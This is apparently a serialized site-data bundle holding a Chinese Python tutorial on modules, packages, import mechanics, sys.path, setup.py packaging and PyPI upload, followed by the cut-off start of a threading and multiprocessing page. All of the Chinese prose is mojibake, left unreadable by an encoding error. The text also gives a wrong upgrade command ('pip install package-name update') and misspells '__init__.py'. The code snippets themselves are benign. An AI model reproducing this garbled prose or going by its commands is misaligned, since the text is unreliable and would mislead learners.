description=\'è¿æ¯ç¬¬ä¸ä¸ªå¯¹å¤åå¸çæ¨¡åï¼æµè¯å¦\',\n    author=\'\', # ä½è\n    #æè¿°\n    author_email=\'aaa@163.com\', py_modules=[\'baizhanMath2.demo1\',\'baizhanMath2.demo2\'] # è¦åå¸çæ¨¡å\n    )\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. æå»ºä¸ä¸ªåå¸æä»¶ï¼æ§è¡python setup.py sdistå½ä»¤ã\n\n 4. æ§è¡å®æä¹åï¼æä»¶ç®å½ä¸çæäºä¸ä¸ªdistæä»¶å¤¹ï¼éé¢çæäºä¸ä¸ªåå¸åã\n    \n    \n\n\n# æ¬å°å®è£æ¨¡å\n\nå°åå¸å®è£å°æ¬å°çè®¡ç®æºä¸ï¼åªéè¦æ§è¡å¦ä¸çå½ä»¤å³å¯ï¼\n\npython setup.py install\n\n\n1\n\n\nå®è£å®æä¹åï¼ä¼å¨pythonç®å½ä¸çlibä¸çsite-packagesç®å½ä¸ä¿å­ãåé¢ç´æ¥ä½¿ç¨importå¯¼å¥å³å¯ã\n\n\n# ä¸ä¼ å°PyPI\n\nå¯ä»¥å°èªå·±å¼åçæ¨¡åä¸ä¼ å°PyPIä¸ï¼å¯ä»¥è®©å¨ççå¼åèèªç±ä½¿ç¨ã\n\né¦åéè¦æ³¨åPyPIè´¦å·ï¼https://pypi.python.org\n\nç¶ååå»ºç¨æ·ä¿¡æ¯æä»¶ .pypirc\n\n# æ¹å¼ä¸ï¼Linux\npython setup.py register\n\n# æ¹å¼äºï¼windows Linux\nå¨å®¶ç®å½ä¸åå»º.pypirc\n[distutils] index-servers=pypi\n\n[pypi] repository = https://upload.pypi.org/legacy/ username = è´¦æ·å password = ä½ èªå·±çå¯ç \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nç¶åè¿å¥setup.pyæå¨çç®å½ï¼ä½¿ç¨python setup.py sdist uploadå³å¯å°æ¨¡åä»£ç ä¸ä¼ å¹¶åå¸ã\n\n\n# ä½¿ç¨ä»äººçæ¨¡å\n\næ¨¡ååå¸å®æä¹åï¼å«äººè¦ä½¿ç¨ï¼åªéè¦è¾å¥ï¼pip install package-nameå³å¯å®è£æ¨¡åã\n\nå¦ææ´æ°äºæ¨¡åï¼ä¹å¯ä»¥ä½¿ç¨pip install package-name updateæ´æ°ã\n\n\n# åº\n\nPythonä¸­çåºæ¯åç¨å¶ä»è¯­è¨çæ¦å¿µï¼å¹¶æ²¡æå·ä½çå®ä¹ï¼æ¨¡åååä¾§éäºä»£ç çç»ç»ãä¸è¬æåµä¸ï¼åºå¼ºè°çæ¯åè½æ§ï¼æä»¬éå¸¸è®²åè½æ¨¡åçéåç§°ä¸ºåºã\n\n\n# Pythonæ ååº\n\nPythonä¸­æä¸ä¸ªå¼ºå¤§çæ ååºãPython è¯­è¨çæ ¸å¿åªåå«æ°å­ãå­ç¬¦ä¸²ãåè¡¨ãå­å¸ã æä»¶ç­å¸¸è§ç±»ååå½æ°ï¼èç± Python æ ååºæä¾äºç³»ç»ç®¡çãç½ç»éä¿¡ãææ¬å¤çãæ°æ® åºæ¥å£ãå¾å½¢ç³»ç»ãXML å¤çç­é¢å¤çåè½ã\n\n\n# ç¬¬ä¸æ¹åº\n\nPythonä¹æä»¥æµè¡ï¼æ¯å ä¸ºæå¾å¤å¼ºå¤§çç¬¬ä¸æ¹åºï¼æä»¬å¯ä»¥å¨https://pypi.orgä¸æç´¢éè¦çç¬¬ä¸æ¹åºã',normalizedContent:'# pythonæ¨¡ååçé£äºäº\n\néçç¨åºçè¶æ¥è¶å¤æï¼å¯¹äºä»£ç çç®¡çæ¾å¾è³å³éè¦ãpythonä¸­å¯¹äºä»£ç çç®¡çæ¯åºäºæ¨¡åååå®ç°çãè¿ä¸ç¯å°±æ´çä¸ä¸å³äºpythonæ¨¡ååçç®åç¨æ³ã\n\n\n# pythonæ¨¡ååç®ä»\n\npythonç¨åºæ¯ç±æ¨¡åç»æçï¼ä¸ä¸ªæ¨¡åå°±å¯¹åºäºä¸ä¸ªpythonæä»¶ãèæ¨¡åæ¯ç±è¯­å¥ç»æçï¼è¿è¡pythonç¨åºæ¶ï¼æç§æ¨¡åä¸­çè¯­å¥çé¡ºåºæ§è¡ä»£ç ãè¯­å¥æ¯pythonç¨åºçæé ååï¼ä¸»è¦ç¨äºåå»ºå¯¹è±¡ãç»åéèµå¼ãè°ç¨å½æ°ãæ§å¶è¯­å¥ç­ç­ã\n\næ¨¡ååç¼ç¨å¯¹äºpythonèè¨è³å³éè¦ï¼æ¨¡åä¸­å¯ä»¥å®ä¹åéå½æ°ãç±»ãæ®éè¯­å¥ç­ãæä»¬å¯ä»¥å°ä¸ä¸ªå¤æçpythonç¨åºåè§£ä¸ºå¤ä¸ªæ¨¡åï¼ä¾¿äºåæçéç¨åè°ç¨ãæ¨¡ååç¼ç¨æä¸é¢çå ä¸ªä¼å¿ï¼\n\n 1. ä¾¿äºå°ä¸ä¸ªä»»å¡åè§£ä¸ºå¤ä¸ªæ¨¡åï¼å®ç°å¢éåé¨çååå¼åï¼å®æå¤§è§æ¨¡ç¨åº\n 2. å®ç°ä»£ç çå¤ç¨ï¼ä¸ä¸ªæ¨¡åå¯ä»¥è¢«åå¤å¤æ¬¡è°ç¨\n 3. å¯ç»´æ¤æ§è¾å¼º\n\npythonä¸­æä¾äºä¸ä¸ªæ ååºæ¨¡åï¼åæ¬æä¾äºæä½ç³»ç»åè½ãç½ç»éä¿¡ãææ¬å¤çãæä»¶å¤çãæ°å­¦è¿ç®ç­ç­ãåæ¶pythonçä½¿ç¨èè¿å¼å¼æºäºå¤§éçç¬¬ä¸æ¹æ¨¡åï¼ä½¿ç¨æ¹æ³åpythonæ ååºç±»ä¼¼ãåè½è¦çäºæ¹æ¹é¢é¢ã\n\næ¨¡ååç¼ç¨çåºæ¬æµç¨\n\n 1. è®¾è®¡apiï¼è¿è¡åè½çæè¿°\n 2. ç¼ç å®ç°apiä¸­æè¿°çåè½\n 3. ç¼åæµè¯ä»£ç ï¼å¹¶æ¶é¤å¨å±ä»£ç \n 4. ä½¿ç¨ç§æå½æ°æ¯å¿åä¸è¢«å¤é¨å®¢æ·ç«¯è°ç¨çå½æ°æ¨¡åå½æ°\n\næ¨¡ååç¼ç¨ä¸­ï¼æéè¦çå°±æ¯è¦åè®¾è®¡åºæ¨¡åçapiï¼ç¶åå¼å§ç¼åä»£ç ï¼å®ç°apiä¸­æè¿°çåè½ï¼æåï¼å¨å¶ä»æ¨¡åä¸­å¯¼å¥æ¬æ¨¡åè¿è¡è°ç¨ãæä»¬éè¿helpæ¥çæ¨¡åçapiï¼ä¸è¬ä½¿ç¨æ¶åå¯¼å¥æ¨¡åï¼ç¶åéè¿helpå½æ°æ¥çã\n\n"""\næ¬æ¨¡åç¨äºè®¡ç®åå·¥çå·¥èµ\n"""\n\ncompany = "sgg"\ndef yearsalary(monthsalary):\n    """æ ¹æ®ä¼ å¥çæèªè®¡ç®å¹´èª"""\n    pass\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¯ä¸ªæ¨¡åé½æä¸ä¸ªåç§°ï¼éè¿ç¹æ®åé__name__å¯ä»¥è·åæ¨¡åçåç§°ï¼å¨æ­£å¸¸æåµä¹ä¸ï¼æ¨¡åçåç§°å¯¹åºçæºæä»¶åï¼ä½æ¯ï¼å¦æå½ä¸ä¸ªæ¨¡åè¢«å½ä½ç¨åºçå¥å£æ¶ï¼å¶åç§°ä¸º__main__ãæä»¬å¯ä»¥æ ¹æ®è¿ä¸ªç¹ç¹ï¼å°æ¨¡åæºä»£ç æä»¶ä¸­çæµè¯ä»£ç è¿è¡å¯¹ç«å¤çã\n\n"""\næ¬æ¨¡åç¨äºè®¡ç®åå·¥çå·¥èµ\n"""\n\ncompany = "sgg"\ndef yearsalary(monthsalary):\n    """æ ¹æ®ä¼ å¥çæèªè®¡ç®å¹´èª"""\n    pass\n\n\n# æµè¯ä»£ç å¯ä»¥è¿æ ·å\nif __name__ == "__main__":\n    print("hello")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\næä»¬å¯ä»¥å¨æ¨¡åçç¬¬ä¸è¡æ·»å ä¸ä¸ªææ¡£å­ç¬¦ä¸²ï¼ç¨äºæè¿°æ¨¡åçç¸å³åè½ï¼ç¶åä½¿ç¨__doc__å¯ä»¥è·åææ¡£å­ç¬¦ä¸²çåå®¹ã\n\n\n# å¯¼å¥æ¨¡å\n\næ¨¡åè®¾è®¡çå¥½å¤ä¹ä¸å°±æ¯ä½¿ä»£ç çå¤ç¨æ§åé«ï¼åå¥½çæ¨¡åå¯ä»¥è¢«ä»»æçåå¤çè°ç¨ãæ¨¡åçå¯¼å¥å°±æ¯å¨æ¬æ¨¡åä¸­ä½¿ç¨å¶ä»çæ¨¡åã\n\n\n# importå¯¼å¥æ¨¡å\n\nimport å¯ä»¥ç´æ¥å¯¼å¥ä¸ä¸ªæå¤ä¸ªæ¨¡åï¼å¹¶å¯ä»¥ç»å¯¼å¥çæ¨¡åéå½åãå¨ä½¿ç¨importå è½½æ¨¡åæ¶åä¸ºåä¸ªç±»å«ï¼\n\n 1. ä½¿ç¨pythonç¼åçä»£ç \n 2. å·²ç»è¢«ç¼è¯ä¸ºå±äº«åºæèddlçcæc++æ©å±\n 3. ä¸ä¸ªä¸ç»æ¨¡åçå\n 4. ä½¿ç¨cç¼åå¹¶é¾æ¥å°pythonä¸­çåç½®çæ¨¡å\n\næä»¬ä¸è¬éè¿importè¯­å¥å®ç°æ¨¡åçå¯¼å¥åä½¿ç¨ï¼importè¯­å¥å®éä¸æ¯ä½¿ç¨äºåç½®å½æ°__import__()ãå½æä»¬éè¿importå¯¼å¥ä¸ä¸ªæ¨¡åæ¶ï¼pythonè§£éå¨è¿è¡æ§è¡ï¼å¹¶å£°ç§°ä¸ä¸ªå¯¹è±¡ï¼è¿ä¸ªå¯¹è±¡å°±ä»£è¡¨äºè¢«å è½½çæ¨¡åã\n\nimport math\nprint(id(math)) # 140277795567584\nprint(type(math)) # <class \'module\'>\nprint(math.pi) # 3.141592653589793\n\n\n1\n2\n3\n4\n\n\nå½æä»¬å¯¼å¥äºä¸ä¸ªæ¨¡åçæ¶åï¼ä¼çæä¸ä¸ªmoduleçç±»çå¯¹è±¡ï¼è¯¥å¯¹è±¡åmathåéå¼ç¨ï¼å¯ä»¥éè¿mathåéå»è®¿é®åå¼ç¨æ¨¡åä¸­çææåå®¹ãæä»¬éè¿importå¯¼å¥å¤ä¸ªæ¨¡åæ¶ï¼æ¬è´¨ä¸ä¹æ¯çæäºmoduleçå¤ä¸ªç±»å¯¹è±¡èå·²ãææ¶åï¼æä»¬éè¦ç»æ¨¡åèµ·ä¸ä¸ªå«åï¼æ¬è´¨ä¸ï¼è¿ä¸ªå«åä»ä»æ¯æ°åå»ºä¸ä¸ªåéæ¿ä»£é»è®¤çåéåå¼ç¨moduleå¯¹è±¡èå·²ã\n\nimport math,os\nprint(type(os)) # <class \'module\'>\nprint(type(math)) # <class \'module\'>\n\nimport math as m\n\nprint(m.pi)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# from importå¯¼å¥\n\npythonä¸­å¯ä»¥ä½¿ç¨from importå¯¼å¥æ¨¡åä¸­çæåï¼å¯¼å¥çæ ¼å¼å¦ä¸ï¼\n\nfrom æ¨¡åå import æå1ï¼æå2\t\n\n\n1\n\n\nå¦æå¸æå¯¼å¥ä¸ä¸ªæ¨¡åä¸­çæææåï¼åå¯ä»¥éç¨å¯¼å¥æå·çæ¹æ³ï¼from æ¨¡åå import *\n\nä½æ¯åºè¯¥å°½éçå»é¿åè¿ç§åæ³ï¼å ä¸ºæå·ä»£è¡¨çæ¯å¯¼å¥æ¨¡åä¸­ææéä¸åçº¿å¼å¤´çåç§°ï¼å°é£æ¶å¦æä½ ä¸ç¥éä½ å¯¼å¥çæ¨¡åä¸­æåªäºåå­ï¼å°±å¯è½è¦çæä½ èªå·±çå®ä¹çåéï¼å¯¼è´å¯è¯»æ§åå·®ï¼æéå°é¾ã\n\n\n# import å from importçåºå«\n\nimportå¯¼å¥çæ¯æ¨¡åï¼èfrom importå¯¼å¥çæ¯æ¨¡åä¸­çä¸ä¸ªå½æ°æèä¸ä¸ªç±»ã\n\nå¯ä»¥ç®åççè§£çè¯ï¼importå¯¼å¥çæ¯ä¸ä¸ªæä»¶ï¼èfrom importå¯¼å¥çæ¯è¿ä¸ªæä»¶ä¸çåå®¹ãå¦æä½¿ç¨importå¯¼å¥çè¯ï¼å°±éè¦ä½¿ç¨æä»¶åç§°è°ç¨å·ä½çæä»¶éé¢çåå®¹ã\n\n\n# __import__()å¨æå¯¼å¥\n\nimportæ¬è´¨ä¸æ¯è°ç¨çåç½®çå½æ°__import__(),æä»¬å¯ä»¥éè¿å®å®ç°å¨æå¯¼å¥ã__import__()å¨æä¼ éä¸éåæ°å¼ï¼å°±è½å¯¼å¥ä¸éçæ¨¡åãä¸è¬æä»¬ä¸å»ºè®®èªè¡ä½¿ç¨__import__()è¿è¡å¯¼å¥ã\n\n\n# æ¨¡åçå è½½\n\nå½ä¸ä¸ªæ¨¡åè¢«å¯¼å¥æ¶ï¼æ¨¡åä¸­çä»£ç å°±ä¼è¢«æ§è¡ï¼å¦æåæ¬¡å¯¼å¥è¿ä¸ªæ¨¡ååä¸ä¼åæ¬¡æ§è¡ãä¸ä¸ªæ¨¡åæ è®ºå¯¼å¥äºå¤å°æ¬¡ï¼è¿ä¸ªæ¨¡åå¨æ´ä¸ªè¿ç¨ä¸­ï¼æä¸åªæä¸ä¸ªå®ä¾å¯¹è±¡ã\n\n\n# å¨æå è½½\n\nææ¶åæä»¬ç¡®å®éè¦éæ°å è½½ä¸ä¸ªæ¨¡åï¼åå¯ä»¥ä½¿ç¨ï¼importlib.reload()æ¹æ³ã\n\nimport calc_salary\n\nimportlib.reload(calc_salary)\n\n\n1\n2\n3\n\n\n\n# package å\n\nå½ä¸ä¸ªé¡¹ç®ä¸­å­å¨å¤ä¸ªæ¨¡åçæ¶åï¼å°±éè¦åæ¬¡è¿è¡ç»ç»ï¼æä»¬å°å·æç¸ååè½çç±»ä¼¼çæ¨¡åæ¾å°ä¸èµ·ï¼å½¢æäºä¸ä¸ªåï¼ä¸ä¸ªåå¿é¡»è¦åå«ä¸ä¸ª__init__.pyçæä»¶ï¼åä¸­å¯ä»¥åå«æ¨¡åï¼ä¹å¯ä»¥åå«å­åã\n\nå¨pycharmä¸­åå»ºåæ¶ï¼pycharmä¼èªå¨å¸®æçæä¸ä¸ªå¸¦æ__init__.pyçæä»¶å¤¹ã\n\n\n# å¯¼å¥å\n\nå½æä»¬éè¦å¯¼å¥æä¸ªaaåä¸çmoduleaaæ¨¡åæ¶ï¼éè¦ä»¥ä¸æ¹æ³ï¼\n\n 1. import aa.moduleaa\n    \n    å¨ä½¿ç¨æ¶ï¼éè¦å®æ´çåç§°æ¥å¼ç¨ï¼aa.moduleaa.func()\n\n 2. from aa import moduleaa\n    \n    å¨ä½¿ç¨æ¶ï¼å¯ä»¥ç´æ¥ä½¿ç¨æ¨¡ååï¼moduleaa.func()\n\n 3. from aa.moduleaa import func\n    \n    å¨ä½¿ç¨æ¶å¯ä»¥ç´æ¥ä½¿ç¨å½æ°åï¼func()\n\nå¯¼å¥åçæ¬è´¨æ¯å¯¼å¥äºåä¸­ç__init__.pyæä»¶ï¼ä¹å°±æ¯è¯´ï¼å¯¼å¥äºimport pack1å°±æ¯å¯¼å¥å¹¶æ§è¡äºpack1åä¸ç__init__.pyæä»¶ãè¿æ ·ï¼æä»¬å°±å¯ä»¥å¨__init__()æ¨¡åä¸­æ¹éå¯¼å¥æä»¬éè¦çæ¨¡åï¼ä¸éè¦ä¸ä¸å¯¼å¥ã\n\n__init__.pyçä¸ä¸ªä½ç¨ï¼\n\n 1. è¯å«å\n 2. å®ç°æ¨¡ç³å¯¼å¥\n 3. ååå§åï¼ç»ä¸å¯¼å¥ä»£ç ãæ¹éå¯¼å¥\n\nteståä¸ç__init__.py\n\nimport turtle\nimport math\n\nprint("å¯¼å¥äºtestå")\n\n\n1\n2\n3\n4\n\n\nå¨demoåä¸­å¯¼å¥äºteståï¼å¹¶ä½¿ç¨teståä¸­å¯¼å¥çmath\n\nimport test\nprint(test.math.pi)\n\n\n1\n2\n\n\n\n# å¯¼å¥æå\n\nimport *çè®ºä¸æä»¶ç³»ç»å¯ä»¥æ¾åºææçå­æ¨¡åï¼å¹¶è¿è¡å¯¼å¥ãä½æ¯è¿åè±è´¹å¤§éçæ¶é´ãpythonæä¾äºä¸ç§åç´¢å¼çæ¹å¼ã\n\nè¿ä¸ªç´¢å¼å¯ä»¥å¨__imit__.pyæä»¶ä¸­å®ä¹ä¸ä¸ª__all__åéï¼å¹¶å°å¯¹åºåä¸çææçæ¨¡åä½ä¸ºåè¡¨åå®¹å­å¥å°__all__ä¸­ï¼è¿æ ·ï¼ä½¿ç¨from test import *å¯¼å¥çå°±æ¯__all__åè¡¨ä¸­çæææ¨¡åäºãä½æ¯ä»ç¶ä¸å»ºè®®è¿æ ·å¯¼å¥ã\n\n\n# ååå¼ç¨\n\nå¦ææ¯å­ååçå¼ç¨ï¼å¯ä»¥æç§ç¸åºçä½ç½®å¼å¥å­æ¨¡åï¼\n\nfrom . import calc\nfrom .. import demo\n\n\n1\n2\n\n\n\n# sys.pathåæ¨¡åçæç´¢è·¯å¾\n\nå½æä»¬å¯¼å¥æä¸ªæ¨¡åæä»¶æ¶ï¼pythonçè§£éå¨æ¯å¦ä½å¯»æ¾è¿ä¸ªæä»¶å¹¶å è½½çå¢ï¼ä¸è¬æç§å¦ä¸çé¡ºåºå¯»æ¾ï¼å¦ææåæ¾ä¸å°å°±ä¼æ¥éï¼\n\n 1. åç½®æ¨¡å\n 2. å½åç®å½\n 3. å½åç¨åºçä¸»ç®å½\n 4. pythonpathç®å½\n 5. æ åé¾æ¥åºç®å½\n 6. ç¬¬ä¸æ¹åºç®å½site-packages\n 7. .pthæä»¶çåå®¹\n 8. sys.path.append()æ·»å çä¸´æ¶ç®å½\n\nå½ä»»ä½ä¸ä¸ªpythonç¨åºå¯å¨çæ¶åï¼é½ä¼æç§ä¸é¢çè·¯å¾æç´¢æ¶éï¼å¹¶æ¾å°sysæ¨¡åçpathå±æ§ä¸­ã\n\næä»¬å¯ä»¥éè¿ä»£ç å¾sys.pathä¸­æ·»å åå®¹ï¼\n\nimport sys\nsys.path.append("/")\n\n\n1\n2\n\n\n\n\npythonpathéè¿æ·»å ç¯å¢åéè®¾ç½®\n\n.pthæä»¶ï¼å¯ä»¥å¨site-packagesç®å½ä¸æ·»å å¦ä¸çåå®¹ï¼\n\n# ä¸è¡åä¸ä¸ª\n/aaa/aa/a\n/bbb/bb/b\n\n\n1\n2\n3\n\n\n\n# æ¨¡åçåå¸åå®è£\n\nå½æä»¬å®ææä¸ªæ¨¡åçå¼ååï¼å¯ä»¥å°å¶å¯¹å¤åå¸ï¼å¶ä»å¼åçå¯ä»¥ä»¥ç¬¬ä¸æ¹æ©å±åºçæ¹å¼ä½¿ç¨æä»¬çæ¨¡åãæ¨¡åçåå¸æ­¥éª¤å¦ä¸ï¼\n\n 1. ä¸ºæ¨¡ååå»ºå¦ä¸çç»ææä»¶å¤¹ï¼ä¸è¬æåµä¸æä»¶å¤¹çåå­åæ¨¡ååå­ä¸è´ï¼\n\n\n\n 2. å¨æä»¶å¤¹ä¸­åå»ºä¸ä¸ªsetup.pyæä»¶ï¼æä»¶åå®¹å¦ä¸ï¼\n    \n    setup(\n    \n    # å¯¹å¤æä»¬æ¨¡åçåå­\n    name=\'\', version=\'1.0\', # çæ¬å· description=\'è¿æ¯ç¬¬ä¸ä¸ªå¯¹å¤åå¸çæ¨¡åï¼æµè¯å¦\',\n    author=\'\', # ä½è\n    #æè¿°\n    author_email=\'aaa@163.com\', py_modules=[\'baizhanmath2.demo1\',\'baizhanmath2.demo2\'] # è¦åå¸çæ¨¡å\n    )\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. æå»ºä¸ä¸ªåå¸æä»¶ï¼æ§è¡python setup.py sdistå½ä»¤ã\n\n 4. æ§è¡å®æä¹åï¼æä»¶ç®å½ä¸çæäºä¸ä¸ªdistæä»¶å¤¹ï¼éé¢çæäºä¸ä¸ªåå¸åã\n    \n    \n\n\n# æ¬å°å®è£æ¨¡å\n\nå°åå¸å®è£å°æ¬å°çè®¡ç®æºä¸ï¼åªéè¦æ§è¡å¦ä¸çå½ä»¤å³å¯ï¼\n\npython setup.py install\n\n\n1\n\n\nå®è£å®æä¹åï¼ä¼å¨pythonç®å½ä¸çlibä¸çsite-packagesç®å½ä¸ä¿å­ãåé¢ç´æ¥ä½¿ç¨importå¯¼å¥å³å¯ã\n\n\n# ä¸ä¼ å°pypi\n\nå¯ä»¥å°èªå·±å¼åçæ¨¡åä¸ä¼ å°pypiä¸ï¼å¯ä»¥è®©å¨ççå¼åèèªç±ä½¿ç¨ã\n\né¦åéè¦æ³¨åpypiè´¦å·ï¼https://pypi.python.org\n\nç¶ååå»ºç¨æ·ä¿¡æ¯æä»¶ .pypirc\n\n# æ¹å¼ä¸ï¼linux\npython setup.py register\n\n# æ¹å¼äºï¼windows linux\nå¨å®¶ç®å½ä¸åå»º.pypirc\n[distutils] index-servers=pypi\n\n[pypi] repository = https://upload.pypi.org/legacy/ username = è´¦æ·å password = ä½ èªå·±çå¯ç \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nç¶åè¿å¥setup.pyæå¨çç®å½ï¼ä½¿ç¨python setup.py sdist uploadå³å¯å°æ¨¡åä»£ç ä¸ä¼ å¹¶åå¸ã\n\n\n# ä½¿ç¨ä»äººçæ¨¡å\n\næ¨¡ååå¸å®æä¹åï¼å«äººè¦ä½¿ç¨ï¼åªéè¦è¾å¥ï¼pip install package-nameå³å¯å®è£æ¨¡åã\n\nå¦ææ´æ°äºæ¨¡åï¼ä¹å¯ä»¥ä½¿ç¨pip install package-name updateæ´æ°ã\n\n\n# åº\n\npythonä¸­çåºæ¯åç¨å¶ä»è¯­è¨çæ¦å¿µï¼å¹¶æ²¡æå·ä½çå®ä¹ï¼æ¨¡åååä¾§éäºä»£ç çç»ç»ãä¸è¬æåµä¸ï¼åºå¼ºè°çæ¯åè½æ§ï¼æä»¬éå¸¸è®²åè½æ¨¡åçéåç§°ä¸ºåºã\n\n\n# pythonæ ååº\n\npythonä¸­æä¸ä¸ªå¼ºå¤§çæ ååºãpython è¯­è¨çæ ¸å¿åªåå«æ°å­ãå­ç¬¦ä¸²ãåè¡¨ãå­å¸ã æä»¶ç­å¸¸è§ç±»ååå½æ°ï¼èç± python æ ååºæä¾äºç³»ç»ç®¡çãç½ç»éä¿¡ãææ¬å¤çãæ°æ® åºæ¥å£ãå¾å½¢ç³»ç»ãxml å¤çç­é¢å¤çåè½ã\n\n\n# ç¬¬ä¸æ¹åº\n\npythonä¹æä»¥æµè¡ï¼æ¯å ä¸ºæå¾å¤å¼ºå¤§çç¬¬ä¸æ¹åºï¼æä»¬å¯ä»¥å¨https://pypi.orgä¸æç´¢éè¦çç¬¬ä¸æ¹åºã',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Pythonå¤çº¿ç¨çé£äºäº",frontmatter:{title:"Pythonå¤çº¿ç¨çé£äºäº",date:"2022-03-28T09:00:00.000Z",permalink:"/sec/dev/python/thread",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/08.Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2020.Python/08.Pythonå¤çº¿ç¨çé£äºäº.md",key:"v-3f2c56fd",path:"/sec/dev/python/thread/",headers:[{level:2,title:"è¿ç¨",slug:"è¿ç¨",normalizedTitle:"è¿ç¨",charIndex:96},{level:3,title:"åå»ºè¿ç¨",slug:"åå»ºè¿ç¨",normalizedTitle:"åå»ºè¿ç¨",charIndex:235},{level:3,title:"ç»§æ¿Processæ¹å¼åå»ºè¿ç¨",slug:"ç»§æ¿processæ¹å¼åå»ºè¿ç¨",normalizedTitle:"ç»§æ¿processæ¹å¼åå»ºè¿ç¨",charIndex:3966},{level:3,title:"è¿ç¨æ± ",slug:"è¿ç¨æ± ",normalizedTitle:"è¿ç¨æ± ",charIndex:4560},{level:3,title:"è¿ç¨é´çéä¿¡",slug:"è¿ç¨é´çéä¿¡",normalizedTitle:"è¿ç¨é´çéä¿¡",charIndex:7649},{level:2,title:"çº¿ç¨",slug:"çº¿ç¨",normalizedTitle:"çº¿ç¨",charIndex:9},{level:3,title:"_threadæ¨¡å",slug:"threadæ¨¡å",normalizedTitle:"_threadæ¨¡å",charIndex:12531},{level:3,title:"threadingæ¨¡å",slug:"threadingæ¨¡å",normalizedTitle:"threadingæ¨¡å",charIndex:12435},{level:3,title:"çº¿ç¨å±äº«å¨å±åé",slug:"çº¿ç¨å±äº«å¨å±åé",normalizedTitle:"çº¿ç¨å±äº«å¨å±åé",charIndex:16929},{level:2,title:"é",slug:"é",normalizedTitle:"é",charIndex:908},{level:3,title:"äºæ¥é",slug:"äºæ¥é",normalizedTitle:"äºæ¥é",charIndex:18039},{level:3,title:"æ­»é",slug:"æ­»é",normalizedTitle:"æ­»é",charIndex:929},{level:3,title:"çº¿ç¨åæ­¥",slug:"çº¿ç¨åæ­¥",normalizedTitle:"çº¿ç¨åæ­¥",charIndex:18278},{level:3,title:"çäº§èåæ¶è´¹èæ¨¡å¼",slug:"çäº§èåæ¶è´¹èæ¨¡å¼",normalizedTitle:"çäº§èåæ¶è´¹èæ¨¡å¼",charIndex:21904},{level:3,title:"ThreadLocal",slug:"threadlocal",normalizedTitle:"threadlocal",charIndex:23157}],excerpt:'<h1 id="pythonå¤çº¿ç¨çé£äºäº"><a class="header-anchor" href="#pythonå¤çº¿ç¨çé£äºäº">#</a> Pythonå¤çº¿ç¨çé£äºäº</h1>\n<p>å¤çº¿ç¨ç±»ä¼¼äºåæ¶æ§è¡å¤ä¸ªä¸åç¨åºï¼æ¯å¦å¨å±æ­çæ¶ååæ¶è·³èãPythonä¸­ä¹æä¾äºå®ç°å¤çº¿ç¨çæ¹å¼ï¼è¿ä¸ç¯ä¸èµ·æ¥çä¸ä¸Pythonä¸­å¦ä½ä½¿ç¨å¤çº¿ç¨ã</p>\n',headersStr:"è¿ç¨ åå»ºè¿ç¨ ç»§æ¿Processæ¹å¼åå»ºè¿ç¨ è¿ç¨æ±  è¿ç¨é´çéä¿¡ çº¿ç¨ _threadæ¨¡å threadingæ¨¡å çº¿ç¨å±äº«å¨å±åé é äºæ¥é æ­»é çº¿ç¨åæ­¥ çäº§èåæ¶è´¹èæ¨¡å¼ ThreadLocal",content:"# Pythonå¤çº¿ç¨çé£äºäº\n\nå¤çº¿ç¨ç±»ä¼¼äºåæ¶æ§è¡å¤ä¸ªä¸åç¨åºï¼æ¯å¦å¨å±æ­çæ¶ååæ¶è·³èãPythonä¸­ä¹æä¾äºå®ç°å¤çº¿ç¨çæ¹å¼ï¼è¿ä¸ç¯ä¸èµ·æ¥çä¸ä¸Pythonä¸­å¦ä½ä½¿ç¨å¤çº¿ç¨ã\n\n\n# è¿ç¨\n\nç¨åºç¼åå®æ²¡æè¿è¡ç§°ä¹ä¸ºç¨åºãæ­£å¨è¿è¡çä»£ç å°±æ¯è¿ç¨ãå¨Python3è¯­è¨ä¸­ï¼å¯¹å¤è¿ç¨æ¯æçæ¯multiprocessingæ¨¡ååsubprocessæ¨¡åãmultiprocessingæ¨¡åä¸ºå¨å­è¿ç¨ä¸­è¿è¡ä»»å¡ãéè®¯åå±äº«æ°æ®ï¼ä»¥åæ§è¡åç§å½¢å¼çåæ­¥æä¾æ¯æã\n\n\n# åå»ºè¿ç¨\n\nPythonæä¾äºç¨äºå¤çå¤è¿ç¨çåmultiprocessingãåå©è¿ä¸ªåï¼å¯ä»¥è½»æ¾å®æä»åè¿ç¨å°å¹¶åæ§è¡çè½¬æ¢ãmultiprocessingæ¯æå­è¿ç¨ãéä¿¡åå±äº«æ°æ®ãè¯­æ³æ ¼å¼å¦ä¸ï¼\n\nProcessï¼[group [, target [, name [, args [, kwargs]]]]]ï¼\n# target è¡¨ç¤ºè°ç¨çå¯¹è±¡\n# nameä¸ºè¿ç¨çåå­\n# args è¡¨ç¤ºè°ç¨å¯¹è±¡çåæ°\n# kargs è¡¨ç¤ºè°ç¨å¯¹è±¡çå­å¸\n# group æªä½¿ç¨ ä¸ºNone\n\n\n1\n2\n3\n4\n5\n6\n\n\nä½¿ç¨ä»¥ä¸çæé å½æ°ï¼å¯ä»¥æé åºä¸ä¸ªProcesså¯¹è±¡ï¼è¯¥å¯¹è±¡æå¦ä¸çå ç§å®ä¾æ¹æ³ï¼\n\næ¹æ³                æè¿°\nis_alive()        å¦æpä»ç¶è¿è¡ï¼è¿åTrue\njoinï¼[timeout]ï¼   ç­å¾è¿ç¨pç»æ­¢ãTimeoutæ¯å¯éçè¶æ¶æéï¼è¿ç¨å¯ä»¥è¢«é¾æ¥æ æ°æ¬¡ï¼ä½å¦æè¿æ¥èªèº«åä¼åºé\nrun()             è¿ç¨å¯å¨æ¶è¿è¡çæ¹æ³ãé»è®¤æ